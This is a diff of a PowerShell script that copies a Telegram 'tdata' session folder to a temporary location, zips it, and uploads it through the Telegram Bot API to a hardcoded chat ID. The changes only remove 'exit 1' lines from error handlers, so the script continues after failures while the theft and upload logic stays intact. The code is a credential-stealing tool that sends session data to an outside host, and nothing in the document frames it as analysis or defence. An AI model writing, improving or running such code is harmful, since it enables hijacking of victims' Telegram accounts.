@@ -9,13 +9,11 @@ $cht = "5047177665"
 # Check if source directory exists
 if (-not (Test-Path -Path $src -PathType Container)) {
     Write-Error "Source directory '$src' does not exist or is inaccessible."
-    exit 1
 }
 
 # Check if TEMP directory is writable
 if (-not (Test-Path -Path $env:TEMP -PathType Container)) {
     Write-Error "TEMP directory '$env:TEMP' is not accessible."
-    exit 1
 }
 
 # Copy tdata to a temporary folder to avoid file locks
@@ -27,7 +25,6 @@ try {
     if (Test-Path -Path $tempFolder) {
         Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
     }
-    exit 1
 }
 
 # Create zip file from the temporary folder
@@ -38,7 +35,6 @@ try {
     if (Test-Path -Path $tempFolder) {
         Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
     }
-    exit 1
 }
 
 # Verify zip file was created
@@ -47,7 +43,6 @@ if (-not (Test-Path -Path $zip -PathType Leaf)) {
     if (Test-Path -Path $tempFolder) {
         Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
     }
-    exit 1
 }
 
 # Send the zip file via Telegram Bot API
@@ -60,7 +55,6 @@ try {
     Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
 } catch {
     Write-Error "Failed to send file via Telegram API: $_"
-    exit 1
 } finally {
     # Clean up temporary files
     if (Test-Path -Path $tempFolder) {
